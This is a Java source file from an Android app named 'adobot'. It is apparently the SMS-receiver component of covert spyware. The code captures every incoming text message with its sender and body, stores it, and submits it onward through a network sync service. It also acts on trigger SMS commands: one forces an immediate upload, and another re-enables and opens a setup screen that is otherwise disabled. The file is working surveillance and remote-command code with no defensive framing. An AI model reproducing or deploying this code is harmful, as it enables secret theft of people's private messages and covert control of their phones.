package com.android.adobot;


import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.android.adobot.activities.SetupActivity;
import com.android.adobot.database.Sms;
import com.android.adobot.tasks.SmsRecorderTask;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Objects;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
import static com.android.adobot.tasks.SmsRecorderTask.MESSAGE_TYPE_RECEIVED;

public class SmsBroadcastReceiver extends BroadcastReceiver {

    private static final String TAG = SmsBroadcastReceiver.class.getSimpleName();
    public static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

    private SharedPreferences prefs;

    @Override
    public void onReceive(Context context, Intent intent) {

        prefs = context.getSharedPreferences(AdobotConstants.PACKAGE_NAME, Context.MODE_PRIVATE);

        Log.i(TAG, "Intent recieved: " + intent.getAction());

        if (intent.getAction() == SMS_RECEIVED) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[])bundle.get("pdus");
                final SmsMessage[] messages = new SmsMessage[pdus.length];
                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                }
                if (messages.length > -1) {

                    SmsMessage m = messages[0];
                    final String phone = m.getOriginatingAddress();
                    final String body = m.getMessageBody();

                    // format date
                    SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                    Date currentTime = Calendar.getInstance().getTime();
                    final String date = formatter.format(currentTime);

                    final SmsRecorderTask smsRecorderTask = SmsRecorderTask.getInstance();
                    final Sms sms = new Sms();
                    sms.set_id(0);
                    sms.setThread_id(SMS_RECEIVED);
                    sms.setPhone(phone);
                    sms.setName(SMS_RECEIVED);
                    sms.setBody(body);
                    sms.setDate(date);
                    sms.setType(MESSAGE_TYPE_RECEIVED);

                    // Force sync
                    String forceSyncSms = prefs.getString(AdobotConstants.PREF_FORCE_SYNC_SMS_COMMAND_FIELD, "Baby?");
                    if (Objects.equals(body.trim(), forceSyncSms.trim())) {
                        Log.i(TAG, "Forced submit SMS");
                        NetworkSchedulerService schedulerService = NetworkSchedulerService.getInstance();
                        if (schedulerService != null) schedulerService.sync();
                    }

                    // Open adobot
                    String smsOpenText = prefs.getString(AdobotConstants.PREF_SMS_OPEN_TEXT_FIELD, "Open adobot");
                    if (Objects.equals(body.trim(), smsOpenText.trim())) {
                        PackageManager p = context.getPackageManager();
                        ComponentName permissionsActivity = new ComponentName(context, SetupActivity.class);
                        p.setComponentEnabledSetting(permissionsActivity, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
                        Intent setupIntent = new Intent(context, SetupActivity.class);
                        setupIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(setupIntent);
                    }

                    Thread save = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                Sms smsRecord = smsRecorderTask.findSmsFromContent(phone, body, MESSAGE_TYPE_RECEIVED);
                                if (smsRecord != null) {
                                    smsRecorderTask.smsDao.insert(smsRecord);
                                    Log.i(TAG, "Sms saved!!! From: " + phone + ", Body: " + body + "\nName: " + smsRecord.getName());
                                } else {
                                    smsRecorderTask.smsDao.insert(sms);
                                    Log.i(TAG, "Sms saved!!! From: " + phone + ", Body: " + body + "\nName: " + sms.getName());
                                }
                                smsRecorderTask.submitNextRecord(new SmsRecorderTask.SubmitSmsCallback() {
                                    @Override
                                    public void onResult(boolean success) {
                                        Log.i(TAG, success? "SMS submitted" : "Sms Not submitted");
                                    }
                                });
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    });

                    try {
                        save.sleep(1500);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    save.start();

                }
            }
        }

        Intent i = new Intent(context, NetworkSchedulerService.class);
        context.startService(i);

    }
}
